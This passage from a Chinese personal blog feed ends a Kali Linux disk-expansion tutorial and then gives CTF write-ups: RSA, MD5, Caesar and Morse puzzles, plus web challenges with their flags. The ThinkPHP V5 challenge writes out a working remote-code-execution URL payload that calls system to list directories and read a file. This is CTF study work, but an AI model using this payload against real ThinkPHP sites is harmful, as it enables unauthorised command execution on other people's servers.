分区</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/018358ee0eb55041.png"></p><p>然后删除 swap 分区</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/80170ffcd881cb15.png"></p><p>接着删除 extended 分区</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/beb78417b76607c0.png"></p><h1 id="四、对-sda1-进行扩容"><a href="#四、对-sda1-进行扩容" class="headerlink" title="四、对 sda1 进行扩容"></a>四、对 sda1 进行扩容</h1><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/95543013d1fa3ea8.png"></p><p><strong>记得预留出空间给 swap 分区</strong></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/4ed24ec42f8790b7.png"></p><p>还原 extended 和 swap 分区</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/15e8ab5a3ce4c26e.png"></p><p>👇👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/07/9ed924578c8f25d0.png"></p><p>👇👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/6c7addc1092af7b2.png"></p><p>👇👇👇</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/008db5e214def9c4.png"></p><p>然后退出保存</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/3ddc012f0ca39d13.png"></p><p>再次 df -h 查看扩容情况</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/2cd8be27caa2819d.png"></p><p><em><strong>成功？ 很多人到这一步就以为成功了</strong></em></p><p><em><strong>扩容是扩了 但是如果你重启会发现 启动的十分甚至有九分之慢</strong></em></p><h1 id="五、修复-SWAP-分区"><a href="#五、修复-SWAP-分区" class="headerlink" title="五、修复 SWAP 分区"></a><em><strong>五、修复 SWAP 分区</strong></em></h1><p><a href="https://blog.csdn.net/qq_45774670/article/details/110673804?ops_request_misc=&request_id=&biz_id=102&utm_term=kali%E6%89%A9%E5%AE%B9sda1%E5%90%8E%E5%AF%BC%E8%87%B4%E5%90%AF%E5%8A%A8%E5%8F%98%E6%85%A2&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110673804.142%5Ev71%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">以下参考</a></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/ce471c6852544e62.png"></p><p>我们首先要获取新 swap 分区的 uuid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blkid</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/1d0d99c08fba8182.png"></p><p>这个 uuid 复制下来 后面要用</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/1edabe3ccd116f03.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/fstab</span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/61515833">关于 vim 命令的使用~</a> </p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/ccd5224b86fa42af.png"></p><p>将这部分的 uuid 改成新的 uuid</p><p>接着</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/f3e5ad3f75f536da.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/08/521c5c3a59c77662.png"></p><p>将这部分的 uuid 也改成新的 uuid</p><blockquote><p>最后用一下这个命令重建一下？（我的没用）</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-initramfs -u</span><br></pre></td></tr></table></figure><p>然后重启一下 kali 就完成扩容啦~</p>]]></content>
      
      
      <categories>
          
          <category> Tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弱口令安全实验室招新赛 WP</title>
      <link href="/posts/5b1733c8e15f/"/>
      <url>/posts/5b1733c8e15f/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>同时几个比赛嘿嘿  就只做了一点点</li></ul><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="82-83-65"><a href="#82-83-65" class="headerlink" title="82.83.65"></a>82.83.65</h2><p>题目脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;*********************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># C = 31021919570683223794356421266753186826747161146739784961769368259629146487802</span></span><br></pre></td></tr></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">31021919570683223794356421266753186826747161146739784961769368259629146487802</span></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e2 = gmpy2.invert(<span class="number">65533</span>,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,e2,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag：qsnctf{RSA_SO_EASY_!}</p><h2 id="babyrsa-RSbaby"><a href="#babyrsa-RSbaby" class="headerlink" title="babyrsa RSbaby"></a>babyrsa RSbaby</h2><p>题目脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b32encode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*************&quot;</span></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">q = getPrime(nbit)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = random.randint(<span class="number">20000</span>,<span class="number">50000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">e -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> b32encode(<span class="built_in">str</span>(c))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 20392798836838831460465406987101354448592610558736461081264936079945558905138</span></span><br></pre></td></tr></table></figure><p>附件hint内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = 185392927331398754034773152474166007097</span><br><span class="line">n = 33047182186833739970146873552408478599841138065558351794468963853252513446871</span><br><span class="line">c = =gzMxUDM5gTN1UDN5kzNwYzM5QjNyEDOwEjN0YzM3gTN1ATM2ITO1gDN0QTNzEDMxcDO5YDM0UjN0AjN0EzM4gzM4YzM4gTO3ITOzAjM</span><br></pre></td></tr></table></figure><p>无语了…看脚本中 <strong>print b32encode(str(c))[::-1]</strong></p><p>表示hint里的c是 base32 编码后倒序  但无法解决</p><p>出题人如是说：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/584c0c7eeca671a4.png"></p><p>压力回到我这边</p><p>写好了解密脚本 但是发现输出搜索没有qsn字符 搜到4个qs字符</p><p>改了一下遍历的循环 从（20000，50000）改成（0，80000）</p><p>反而搜到的qs字符 从4个变为了3个 崩溃了 怎么越大越少</p><p>询问发现：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/5618473468c8470c.png"></p><p><a href="https://blog.csdn.net/qq_39445165/article/details/111527876?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-111527876-blog-114140596.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-111527876-blog-114140596.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=11">搜索保存到文件方法</a>    有所收获</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">33047182186833739970146873552408478599841138065558351794468963853252513446871</span></span><br><span class="line">c = <span class="number">20392798836838831460465406987101354448592610558736461081264936079945558905138</span></span><br><span class="line">p = <span class="number">185392927331398754034773152474166007097</span></span><br><span class="line">q = <span class="number">178254816203211010200541534520241056143</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;xxx.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20000</span>,<span class="number">50000</span>,<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line">e2 = invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,e2,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m),file=file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>如果是循环内不能将 file 打开文件放在循环内 不然只会print一次</strong></em></p></blockquote><p>打开保存的txt 搜索得到flag</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/a8c984f984ff6ba3.png"></p><p>flag：qsnctf{!RSA_SO_EASY$$}</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青少年CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF2022 WP</title>
      <link href="/posts/04cdfb780576/"/>
      <url>/posts/04cdfb780576/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>偏新手的比赛 但是水平还是不足~ 只做了一部分</li></ul><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h2><p>题目脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="string">&#x27;x&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="comment"># x不是一个字符是n个字符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">file.write(md5(i.encode()).hexdigest()+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>附件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">4c614360da93c0a041b22e537de151eb </span><br><span class="line">8d9c307cb7f3c4a32822a51922d1ceaa </span><br><span class="line">0d61f8370cad1d412f80b84d143e1257 </span><br><span class="line">b9ece18c950afbfa6b0fdbfa4ff731d3 </span><br><span class="line">800618943025315f869e4e1f09471012 </span><br><span class="line">f95b70fdc3088560732a5ac135644506 </span><br><span class="line">e1671797c52e15f763380b45e841ec32 </span><br><span class="line">c9f0f895fb98ab9159f51fd0297e236d </span><br><span class="line">a87ff679a2f3e71d9181a67b7542122c </span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7 </span><br><span class="line">e1671797c52e15f763380b45e841ec32 </span><br><span class="line">8277e0910d750195b448797616e091ad </span><br><span class="line">cfcd208495d565ef66e7dff9f98764da </span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c </span><br><span class="line">c9f0f895fb98ab9159f51fd0297e236d </span><br><span class="line">92eb5ffee6ae2fec3ad71c777531578f </span><br><span class="line">45c48cce2e2d7fbdea1afc51c7c6ad26 </span><br><span class="line">cfcd208495d565ef66e7dff9f98764da </span><br><span class="line">a87ff679a2f3e71d9181a67b7542122c </span><br><span class="line">1679091c5a880faf6fb5e6087eb1b2dc </span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7 </span><br><span class="line">4a8a08f09d37b73795649038408b5f33 </span><br><span class="line">cfcd208495d565ef66e7dff9f98764da </span><br><span class="line">e1671797c52e15f763380b45e841ec32 </span><br><span class="line">c9f0f895fb98ab9159f51fd0297e236d </span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7 </span><br><span class="line">cfcd208495d565ef66e7dff9f98764da </span><br><span class="line">c9f0f895fb98ab9159f51fd0297e236d </span><br><span class="line">cfcd208495d565ef66e7dff9f98764da </span><br><span class="line">e1671797c52e15f763380b45e841ec32 </span><br><span class="line">45c48cce2e2d7fbdea1afc51c7c6ad26 </span><br><span class="line">1679091c5a880faf6fb5e6087eb1b2dc </span><br><span class="line">e1671797c52e15f763380b45e841ec32 </span><br><span class="line">8f14e45fceea167a5a36dedd4bea2543 </span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c </span><br><span class="line">c4ca4238a0b923820dcc509a6f75849b </span><br><span class="line">c9f0f895fb98ab9159f51fd0297e236d </span><br><span class="line">a87ff679a2f3e71d9181a67b7542122c </span><br><span class="line">cbb184dd8e05c9709e5dcaedaa0495cf</span><br></pre></td></tr></table></figure><p>md5 按道理不可逆 但是有网站有数据库查询</p><p>那就一个一个在线网站搜呗  <a href="https://www.cmd5.com/">md5-1</a>  <a href="https://md5.cn/">md5-2</a> </p><p>（现在知道他是一个个字符 可以用脚本来遍历查询）</p><p>一个一个输解出来：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/a7916a57a26c96bc.png"></p><p>flag：UNCTF{e84fed028b9046fc0e8f080e96e72184}</p><h2 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h2><p>附件：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/01/f825116b51dd48da.png"></p><p>想到凯撒密码的表替换成 base64</p><p>想训练一下写脚本  百度到了 base64 的表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">oldstr = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;&#x27;</span></span><br><span class="line">newstr = []</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>] </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> oldstr:</span><br><span class="line"><span class="keyword">if</span> x <span class="keyword">in</span> base64_list:</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line"><span class="keyword">if</span> (base64_list[y] == x):</span><br><span class="line">m = y + <span class="number">19</span>   <span class="comment">#自己改偏移量</span></span><br><span class="line"><span class="keyword">if</span>(m&gt;<span class="number">64</span>):</span><br><span class="line">m=m-<span class="number">64</span></span><br><span class="line">x=base64_list[m]</span><br><span class="line"><span class="built_in">print</span>(x,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(x,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>（这次写脚本学到的知识点！！！）</strong></em> 👇👇</p><p><em><strong>if x in base64_list: —— 可以检验这个值是否在数组内</strong></em></p><p><em><strong>print(x,end&#x3D;’’) —— 可以把字符全部打印在一行</strong></em></p></blockquote><p>flag：UNCTF{w0w_Th1s_d1fFerent_c4eSar}</p><h2 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h2><p>附件：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/3a13704d76a501b4.png"></p><p>一开始真没想到摩斯密码，捣鼓了好久二进制</p><p>继续练习写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line"><span class="keyword">if</span> (i == <span class="string">&quot;1&quot;</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (i == <span class="string">&quot;0&quot;</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (i==<span class="string">&quot;/&quot;</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;/&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>（现在发现有能直接自定义01和分隔符的在线转换网站 👇👇 ）</p><p><a href="https://www.lddgo.net/encrypt/morse">摩斯密码在线网站（可自定义）</a></p><p>flag：UNCTF{Y4S_TH1S_JUST_M0RSE}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h2><p>一个游戏题 打通：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/a32c629ea03b8656.png"></p><p>或者查看源代码 搜索 UNCTF</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/7c4ba43864834af6.png"></p><p>搜索 alert</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/10e065ec3b22ad63.png"></p><p>但是不知道怎么弄捏~</p><p>flag：unctf{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}</p><h2 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h2><blockquote><p><em><strong>做 web 尽量不要用校园网 做不出来还真可能是 nt 校园网的原因</strong></em></p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/04f1bf22509af82c.png"></p><p>flag：UNCTF{b9966f9b-d8e5-44f8-93da-a51e0834636d}</p><h2 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h2><p>ThinkPHP V5 看到就想起来攻防世界的一道经典 phprce   <a href="https://blog.csdn.net/qq_60905276/article/details/121273786?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166861343816800186551276%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166861343816800186551276&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-121273786-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v3&utm_term=phprce&spm=1018.2226.3001.4187">相关链接</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/58430bc4d4c18092.png"></p><p>没东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">ls</span>%20/</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/35d84bd1e0254d16.png"></p><p>发现 openthis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">cat</span>%20/openthis</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/45eedc02223795c7.png"></p><p>flag：UNCTF{Y0u_A3r_so_G9eaD_hacker}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>附件：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/06/bbcf8dd9cb3eceba.png"></p><p>搜索上面的打油诗发现是关于乱码的笑话   <a href="http://www.mytju.com/classCode/tools/messyCodeRecover.asp">乱码恢复</a>  